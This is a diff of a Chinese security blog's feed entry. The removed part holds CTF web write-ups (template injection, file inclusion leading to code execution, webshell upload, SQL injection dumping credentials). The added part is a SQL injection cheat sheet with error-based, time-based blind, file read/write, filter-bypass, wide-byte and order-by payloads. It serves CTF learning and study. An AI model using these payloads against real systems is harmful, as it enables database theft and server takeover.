+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">database</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+<p>#关键表被禁用可以这样写:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span> !<span class="number">1</span>)a <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">database</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
 
-<p>注：1.flask是python的web 框架。<br>2.处理URL到python函数映射关系的程序一般叫做路由(Router)<br>3.上面的payload利用了flask-ssti模板注入漏洞。<br>4.<a href="https://www.cnblogs.com/zaqzzz/p/10251892.html这个是关于这个模板注入的总结。">https://www.cnblogs.com/zaqzzz/p/10251892.html这个是关于这个模板注入的总结。</a><br><strong><em>2.文件包含漏洞</em></strong><br><img data-src="https://img-blog.csdnimg.cn/20200731212317461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731212331696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：题目已经给出了提示让让利用后门入侵系统，这里一系列的按钮只有设备维护可以打开<br><img data-src="https://img-blog.csdnimg.cn/20200731212555322.png" alt="在这里插入图片描述"><br>查看源码后发现<img data-src="https://img-blog.csdnimg.cn/20200731212804869.png" alt="在这里插入图片描述"><br>咱们试着输入<br><img data-src="https://img-blog.csdnimg.cn/20200731212836747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里咱们利用php伪协议中php://filter读取源码。发现<br><img data-src="https://img-blog.csdnimg.cn/20200731213049962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里将页面显示出来的用base64解密。<br><img data-src="https://img-blog.csdnimg.cn/202007312133193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里可以利用preg_replace漏洞，执行php语句。传入三个参数使用burp抓包修改传入的参数，使php代码执行。<br><img data-src="https://img-blog.csdnimg.cn/20200731214912537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现咱们测试的代码执行，接下来咱们使用system(“ls”)获取文件目录<br><img data-src="https://img-blog.csdnimg.cn/20200731215309708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来咱们使用system(“cd%20s3chahahaDir/flag%26%26+ls”)进入这个s3这个目录并且查看这个目录的文件。<br><img data-src="https://img-blog.csdnimg.cn/20200731215717611.png" alt="在这里插入图片描述"><br>发现目录下有个flag文件.继续查看得到flag.php.<br>3.<br><img data-src="https://img-blog.csdnimg.cn/2020073122120290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221412695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：咱们点击view-source查看下源码。<br><img data-src="https://img-blog.csdnimg.cn/20200731221513354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221535708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221549514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里发现咱们需要绕过isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== ‘1’ &amp;&amp; substr($_GET[id], -1) === ‘9’，<br>这里限制了id值需要为浮点型但是不完全等于1，还要为字符串要等于9.这里设置1和9之间加入任意字符就行。即可绕过。<br>在burp中咱们上传一句话木马<br><img data-src="https://img-blog.csdnimg.cn/20200731224325519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用webshell工具连接<br><img data-src="https://img-blog.csdnimg.cn/20200731224455496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag.<br>4.<img data-src="https://img-blog.csdnimg.cn/20200801105925269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801110021536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801110034466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:这里根据页面咱们先注册个账号。<br><img data-src="https://img-blog.csdnimg.cn/20200801110153755.png" alt="在这里插入图片描述"><br>这里注册成功后显示普通用户登录成功没什么用，说明咱们需要管理员登录。而登陆与注册页面没什么可利用的，发现还有个找回密码的页面先打开看看经过使用1’ or 1=1#测试发现该页面存在sql注入漏洞。<br><img data-src="https://img-blog.csdnimg.cn/20200801110919372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用union select测试那个字段可用。发现字段3可用<br><img data-src="https://img-blog.csdnimg.cn/20200801111935849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>)<br>使用1’union select 1,2，database（），4#发现查询数据库失败。换一条语句试试1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#发现<br><img data-src="https://img-blog.csdnimg.cn/20200801111814146.png" alt="在这里插入图片描述"><br>找到数据库后就是找表与列。<br>1’union select 1,2,(table_name),4 from information_schema.tables where table_schema=’cetc004’#<br><img data-src="https://img-blog.csdnimg.cn/20200801112328921.png" alt="在这里插入图片描述"><br>1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name = ‘user’#使用这个语句查询表单的列<br><img data-src="https://img-blog.csdnimg.cn/20200801112711933.png" alt="在这里插入图片描述"><br>这里只使用username与password两列。<br>1’union select 1,2,group_concat(username),4 from cetc004.user#<br>1’union select 1,2,group_concat(password),4 from cetc004.user#<br><img data-src="https://img-blog.csdnimg.cn/20200801113210591.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/2020080111325379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到了用户名和密码。<br>这里发现密码用MD5解密打不开，这里咱们重复注册一个管理员账号即可得到flag.<br>5.<img data-src="https://img-blog.csdnimg.cn/20200801114624474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801115242239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:试着输入上面给的域名发现没有任何回应。试着使用127.0.0.1发现<br><img data-src="https://img-blog.csdnimg.cn/20200801115419993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现执行的是ping命令。利用模糊测试发现字符超过0x7F的ASCII都会引发Django的报错。咱们输入%80<br><img data-src="https://img-blog.csdnimg.cn/20200801115807863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现报错信息。复制这段html后打开查看<br><img data-src="https://img-blog.csdnimg.cn/2020080112022260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这里面找到了绝对网址<br><img data-src="https://img-blog.csdnimg.cn/2020080112031853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来在url中输入?url=@+绝对网址即可得到flag.</p>
+<p>#rand被禁用还可以这样写:select min(@a:=1) from information_schema.tables group by concat(user(),@a=(@a+1)%2)<br>#利用xpath函数(extractvalue，updatevalue)进行报错注入</p>
+</li>
+<li><p>extractvalue(目标xml文档，xml路径)。在xml查找时路径格式应该为/a/b/c。如果写入其他格式就会报错。并且返回报错的内容。</p>
+</li>
+<li><p>updatexml(目标文档，xml路径，更新的内容)，报错同上。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">extractvalue(0x7e,concat(0x7e,((<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&lt;<span class="number">0</span>)))<span class="comment">--+</span></span><br><span class="line">updatexml(<span class="number">0x7e</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>),<span class="number">0x7e</span>) <span class="keyword">or</span> <span class="number">1</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+<p><strong><em>基于延时的sql盲注</em></strong><br>#if,ascii,substr的结合使用</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((slect user()),1,1))=num,1,sleep(num))</span><br><span class="line">if(ORD(mid((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="keyword">num</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="keyword">num</span>))</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">80</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><strong><em>sql注入关于文件</em></strong><br>#向数据库中写入文件(into outfile)</p>
+</li>
+<li><p>简单的语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"文件路径记得转义斜杠"</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>#将数据库中的文件导出</p>
+</li>
+<li><p>导出文件需</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">load_file</span>(<span class="string">"path"</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li>
+<li><p>联合起来： </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">load_file</span>(<span class="string">"path"</span>) <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"path"</span> <span class="comment">--+ 这个需要开启secure_file_prive=</span></span><br></pre></td></tr></table></figure>
+<p>#修改文件操作</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"path"</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> xxxx</span><br></pre></td></tr></table></figure>
+<p><strong><em>sql注入关于转义函数</em></strong></p>
+</li>
+<li><p>php默认对所有提交的数据自动调用转义函数(addslashes())</p>
+</li>
+<li><p>受addslashes()函数影响的字符 “‘“,’”‘,”&quot;,”NULL”</p>
+</li>
+<li><p>受mysql_real_escape_string()函数影响的字符 “\x00”,”\n”,”\r”,”&quot;,”‘“,”””,”\x1a”</p>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">stripslashes()</td>
+<td align="center">删除由addashles函数添加的反斜杠，也就是’\‘变为’&#39;,’&#39;‘变为’’’</td>
+</tr>
+<tr>
+<td align="center">mysql_real_escape_string()</td>
+<td align="center">函数转义sql使用字符串中的特殊字符,成功返回true</td>
+</tr>
+<tr>
+<td align="center">get_magic_quotes_gpc()</td>
+<td align="center">对提交的字符串进行检测是否转义，高版本已启用</td>
+</tr>
+<tr>
+<td align="center"><strong><em>sql注入关于过滤</em></strong></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>对于or/and的过滤 可以使用 双写 ‘/**/‘, &amp;&amp;或||,hex，urlencode编码来绕过</p>
+</li>
+<li><p>对于空格可以嵌套(),/<strong>/或者用一些特殊字符替换,如：%09(TAB键),%0a(新的一行),%0c(新的一页),%0d(return),%0b(TAB垂直,windwos下可以解析),%a0(空格)<br>*</strong>sql关于宽字节注入***<br>#原理：</p>
+</li>
+<li><p>&#39;的url编码为%5c%27</p>
+</li>
+<li><p>mysql使用gbk编码会认为两个字符为一个汉字。如果过滤”‘“采用的是反斜杠转义,那么可以采用%df去与%5c结合绕过过滤。</p>
+</li>
+<li><p>简单的语句：-1%20%df%27union%20select%201,2,3–+;这种仅限于get型，如果是post则需要将utf-8的”‘“转换为utf-16,或者utf-32。<br><strong><em>sql关于order by之后的注入</em></strong><br>#sql语句：select * from user order by xxx</p>
+</li>
+<li><p>order by注入是按照某一列进行排序，不能使用and 1=1来判断是否存在注入</p>
+</li>
+<li><p>简单的语句：?sort=(select count(<em>) from information_schema.columns group by concat(0x7e,(select user()),0x7e,floor(rand(0)</em>2)))–+</p>
+</li>
+<li><p>如果order by后面跟的是类似于id这种数值型参数，那么可以使用异或字符与正则匹配进行注入。如：?sort=异或(select(select user())regexp ‘异或xx’<br>   如果正则匹配返回正确,那么他会返回二进制数值的1与前面的数值进行异或，那么数据的排序就会乱掉不再是升序排序。</p>
+</li>
+</ul>
 ]]></content>
       <categories>
-        <category>攻防</category>
+        <category>渗透测试</category>
       </categories>
   </entry>
   <entry>
